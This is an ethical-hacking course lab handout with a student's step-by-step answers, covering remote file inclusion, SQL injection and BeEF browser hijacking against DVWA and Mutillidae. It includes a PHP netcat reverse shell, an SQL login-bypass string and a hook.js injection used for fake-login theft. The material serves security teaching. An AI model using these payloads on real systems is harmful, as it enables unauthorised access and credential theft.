@@ -1,0 +1,219 @@
+current lab:
+
+
+CSCI369 Ethical Hacking
+
+
+Lab 8 - Exploiting Vulnerable Web Services
+Objective: Performing File Inclusion, SQL Injection and Browser Hijacking
+For submission: You must include screenshots and text explanations of the steps conducted in solving the lab tasks in the lab template. This is a graded lab. The submission is required within 24 Hours.
+
+
+1) Remote File Inclusion (RFI) is the concept of including files in the execution of a web application from a different host. From an attacker's point of view, this feature can be exploited to execute scripts and commands stored on the attacker's computer which will allow the attacker to gain further access to a system running the web service.
+
+The Metasploitable system has an Apache2 web server which runs several vulnerable web services. To use this, you will first have to configure it to allow the features we want to exploit.
+
+On Metasploitable, open the configuration file for php5 at /etc/php5/cgi/php.ini with sudo, since you will need the privileges to modify and save this file. Search for the options allow_url_fopen and allow_url_include, and turn these options to On. Once you turn the options on, restart the webserver with sudo /etc/init.d/apache2 restart
+ 
+
+The purpose of the following attack is to have a webserver running on your Kali VM as well with a malicious script in the html folder, so you can ask the web service to include it and establish a reverse shell.
+
+Modify and paste the following code into a file script.txt in the folder /var/www/html
+<?php
+    passthru("nc -e /bin/bash [Kali IP] 5555"); 
+?>
+
+
+ 
+
+Prepare your VM for the attack by starting Apache2 with the command service apache2 start, then start listening for connections with the netcat command on port 5555 with the following command nc -vv -l -p 5555
+ 
+
+Open your browser and type in the IP address of your Metasploitable VM, which is running web services. Log in to DVWA, which stands for Damn Vulnerable Web Application with username: admin and password: password.
+
+Go to the DVWA Security in the left panel and set the security level to low, which will allow remote file inclusion. Go to the File Inclusion tab on the left panel and read the description on how to include a remote file. The following URL will let you include your file: 
+
+[Metasploitable IP]/dvwa/vulnerabilities/fi/?page=http://[Kali IP]/script.txt
+
+ 
+ 
+If you've done everything correctly, you should see a new connection on the terminal listening to connections using netcat.
+Include a screenshot of your established connection and explain how you could establish this attack on another port. What would you need to change in the steps?
+
+┌──(7838220㉿kali)-[~/Desktop/369/lab 8]
+└─$ nc -vv -l -p 5555
+
+listening on [any] 5555 ...
+10.0.2.10: inverse host lookup failed: Unknown host
+connect to [10.0.2.7] from (UNKNOWN) [10.0.2.10] 39139
+whoami
+www-data
+ls
+help
+include.php
+index.php
+source
+
+
+
+ 
+
+
+
+me:
+Part 1: Remote File Inclusion (RFI)
+🔧 Step 1: Enable RFI on Metasploitable
+1.	Log into Metasploitable VM.
+2.	Open the PHP config file:
+sudo nano /etc/php5/cgi/php.ini
+3.	Search (Ctrl+W) for the following lines and set them:
+allow_url_fopen = On
+allow_url_include = On
+4.	Restart Apache2:
+sudo /etc/init.d/apache2 restart
+💀 Step 2: Prepare Malicious Script on Kali
+1.	On Kali VM, create a file in the Apache directory:
+sudo nano /var/www/html/script.txt
+2.	Paste this PHP reverse shell:
+<?php
+    passthru("nc -e /bin/bash [KALI_IP] 5555");
+?>
+🔁 Replace [KALI_IP] with your Kali machine's IP (use ip a if unsure).
+3.	Start Apache server:
+sudo service apache2 start
+4.	Start netcat listener on Kali:
+nc -vv -l -p 5555
+🌐 Step 3: Launch the Attack via DVWA
+1.	On Metasploitable, open browser:
+http://[METASPLOITABLE_IP]/dvwa
+2.	Login: admin / password
+3.	Set security to Low via “DVWA Security” tab.
+4.	Go to “File Inclusion”.
+5.	Enter this URL:
+http://[METASPLOITABLE_IP]/dvwa/vulnerabilities/fi/?page=http://[KALI_IP]/script.txt
+6.	On Kali, you should get a reverse shell in your terminal.
+🖼️ Take a screenshot of the netcat session showing the shell.
+📘 Explain how to change the port:
+If you wanted to use port 4444 instead of 5555:
+•	Change 5555 to 4444 in both the PHP script and nc listener command. … (idk just put the ans here)
+
+
+2) SQL Injection is one of the most common techniques to attack websites and services that use a database. The aim of the attack is to enter some specific input to fields used by the application to trick the SQL query into running extra arguments that the developer did not intend to include. It is fairly easy to prevent this type of attack by thoroughly checking the parameters given by the user before using it in an SQL query.
+
+First you will need to make a small change in Metasploitable and the Mutillidae service. Open the file at /var/www/mutillidae/config.inc and change the database name to owasp10.
+ 
+
+Open your browser and type in the IP address of your Metasploitable VM, which is running web services. This time pick the Mutillidae service and log in with username: admin and password: password. You will get the error that your password doesn't match. Try again but this time as an apostrophe for the password, which should interfere with the SQL statement. You will get the following:
+
+ 
+
+The Diagnostic Information shows you the statement that was sent. The # character will comment out the rest of the SQL statement. Use this information to enter a password that will make the SQL statement select one or more accounts, making the login statement true.
+
+ 
+
+Show that you are logged in and explain what password you use and how it works.
+
+me:
+
+
+Part 2: SQL Injection on Mutillidae
+🛠️ Step 1: Configure Database on Metasploitable
+1.	On Metasploitable, edit config:
+sudo nano /var/www/mutillidae/config.inc
+2.	Change:
+$db_name = 'owasp10';
+🔐 Step 2: SQL Injection
+1.	Open browser and go to:
+http://[METASPLOITABLE_IP]/mutillidae
+2.	Go to Login page.
+3.	Enter:
+Username: admin
+Password: '
+4.	You’ll get a diagnostic error. Use this to construct a bypass input like:
+Password: ' OR '1'='1' --
+5.	This will login successfully.
+🖼️ Take a screenshot of the logged-in Mutillidae page.
+📘 Explain how it works:
+•	' OR '1'='1' -- makes the SQL query always true and comments out the rest of the query.
+
+
+3) BeEF (Browser Exploitation Framework) is a tool that connects target remote browsers with a hook and allows the attacker to execute scripts which can be used to monitor a target or gather information live.
+
+To start working with BeEF, open a terminal and install it with the command:
+sudo apt-get install beef-xss
+
+If you are getting errors, edit the sources.list file as such:
+sudo mousepad /etc/apt/sources.list
+
+Change the “http” that is right after “deb” to “https”.
+ 
+
+Then try installing beef-xss again.
+
+Open the application by the command beef-xss in the terminal. If the application is asking for setting the password, set the password to feeb (beef backwards). Once you've done that, the application will open a browser and ask you to log in. If the browser does not open, open it yourself and go to the address 
+http://127.0.0.1:3000/ui/panel
+ 
+ 
+
+Modify and paste the following code into index.html in the folder /var/www/html
+<html>
+<script src="http://[Kali IP]:3000/hook.js"> </script>
+</html>
+
+ 
+Start the Apache webserver using the command:
+sudo service apache2 start
+
+On your Ubuntu VM, open a browser and type in your Kali Machine's IP to reach the website hosted by the webserver on Kali, hosting your script index.html. Normally, you could enter this script into HTML files if you do Man in the Middle attacks, but this is simpler for this example.
+
+You should see that the browser from Ubuntu appeared on your BeEF UI.
+ 
+
+Click on the Hijacked browser on the left, then go to Commands and search for the Module "Pretty Theft". Execute the module and you should see a popup window on the Ubuntu VM's Browser.
+ 
+Take a screenshot of the popup window.
+
+
+Me:
+
+✅ Part 3: BeEF - Browser Hijacking
+💣 Step 1: Install BeEF on Kali
+1.	If not installed:
+sudo apt-get install beef-xss
+2.	If you get an error, fix sources:
+sudo mousepad /etc/apt/sources.list
+Replace:
+deb http://... → deb https://...
+Then:
+sudo apt-get update
+sudo apt-get install beef-xss
+🧠 Step 2: Start BeEF
+1.	Run:
+beef-xss
+2.	Set password as feeb if asked.
+3.	Go to:
+http://127.0.0.1:3000/ui/panel
+Login: beef / feeb
+🌐 Step 3: Hook the Browser (Ubuntu VM)
+1.	On Kali, edit index.html:
+sudo nano /var/www/html/index.html
+2.	Add this code:
+<html>
+<script src="http://[KALI_IP]:3000/hook.js"></script>
+</html>
+3.	Start Apache:
+sudo service apache2 start
+4.	On Ubuntu VM, open browser:
+http://[KALI_IP]
+5.	On Kali (BeEF UI), you’ll see Ubuntu browser appear.
+🎯 Step 4: Run BeEF Exploit
+1.	In BeEF UI, click the hooked browser.
+2.	Go to Commands.
+3.	Search for Pretty Theft.
+4.	Run the module.
+5.	A fake login popup should appear on Ubuntu.
+
+ 
+ 
+
+
